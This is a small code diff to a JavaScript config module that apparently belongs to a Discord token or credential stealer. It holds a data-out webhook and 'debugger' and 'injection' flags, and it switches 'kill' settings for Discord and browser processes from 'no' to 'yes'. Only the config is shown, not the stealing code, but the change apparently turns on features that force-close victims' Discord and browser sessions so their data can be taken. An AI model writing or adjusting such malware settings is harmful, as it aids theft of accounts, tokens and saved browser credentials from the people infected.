@@ -5,8 +5,8 @@ module.exports = function getconfig() {
     return {
         "webhook": process.env.WEBHOOK || "",
         "kill":{ 
-            "discords": "no",
-            "browsers": "no",
+            "discords": "yes",
+            "browsers": "yes",
         }, 
         "debugger": "yes", 
         "injection": "yes", 
